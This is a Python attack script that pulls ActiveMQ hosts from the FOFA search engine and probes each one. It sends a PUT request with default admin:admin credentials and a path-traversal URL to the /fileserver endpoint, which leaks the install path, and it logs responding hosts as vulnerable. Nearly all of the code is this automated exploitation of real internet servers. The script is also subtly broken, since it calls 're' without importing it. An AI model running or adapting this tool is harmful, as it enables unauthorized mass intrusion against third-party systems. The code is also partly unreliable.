#!/usr/bin/env python
# -*- coding:utf-8 -*-
# author: d3ckx1

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import pyfofa
import os
import time
from colorama import Fore

banner = Fore.GREEN +'''

               _                    ___         ___                          
              ( )_                /'___)      /'___)                         
   _ _  _   _ | ,_)   _   ______ | (__   _   | (__   _ _    __         _ _   
 /'_` )( ) ( )| |   /'_`\(______)| ,__)/'_`\ | ,__)/'_` ) /'__`\(`\/')( '_`\ 
( (_| || (_) || |_ ( (_) )       | |  ( (_) )| |  ( (_| |(  ___/ >  < | (_) )
`\__,_)`\___/'`\__)`\___/'       (_)  `\___/'(_)  `\__,_)`\____)(_/\_)| ,__/'
                                                                      | |    
                                                                      (_)    
                        | code by d3ckx1 |
                           

'''
print (str(banner))

def autoexp(url):

    url1 = str(url) + "/fileserver/a../../%08/..%08/.%08/%08"

    print (Fore.GREEN + ("\n [*] target is " + str(url)))

    headers = {
        "Authorization": "Basic YWRtaW46YWRtaW4=",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "DNT": "1",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }


    try:
        r1 = requests.put(url=url1, headers=headers, allow_redirects=False, timeout=5)
        if r1.status_code == 500:
            path = re.findall(r"(.*)fileserver", r1.reason)[0]
            print('ActiveMQ_put_path：' + path)
            print (Fore.YELLOW + ("[+]" + str(url) + ' is vuln!'))
            vulfile = open('vuln.txt', 'a+')
            vulfile.write(str(url))
            vulfile.write("\n")
            vulfile.close()


        else:
            pass

    except:
       pass


if __name__ == "__main__":
    print (Fore.GREEN + ('+' * 8 + ' 开启Fofa自动抓取工作...' + '+' * 8))

    email, key = ('d3ck@qq.com','xxxxxxxxxxx')  #输入email和key
    client = pyfofa.FofaAPI(email, key)                                 #将email和key传入fofa.Client类进行初始化和验证，并得到一个fofa client对象
    query_str = 'body="ActiveMQ"&&port="8161"'
    num = 0
    result = []
    print (Fore.GREEN + ('+' * 8 + ' 程序当前目录为:' + '+'*8))
    print (os.getcwd())
    print (Fore.GREEN + ('+' * 8 + ' 开启Fofa自动抓取工作...' + '+'*8))
    try:
        for page in range(1,500):                                          #从第1页查到第2页,一页200条

            data = client.get_data(query_str,page=page,fields="ip,host,country")  #查询第page页数据的ip和城市
            for ip,host,country in data["results"]:
                result.append(host)
                print ("%s,%s,%s" %(ip,host,country))                              #打印出每条数据的ip和城市
                with open('targets.txt','w') as f:
                    for i in result:
                        #if "http" not in i:
                        #    i = "https://" + i
                        f.writelines(i+'\n')
        print(Fore.GREEN + ("抓取完成！目标地址写入 targets.txt 成功！"))

    except:
        pass

    print(Fore.GREEN + ("开启漏洞利用工作...."))
    urls = open('targets.txt', 'rb')
    for urlss in urls.readlines():
        url = urlss.strip()
        autoexp(url)
        time.sleep(0.5)
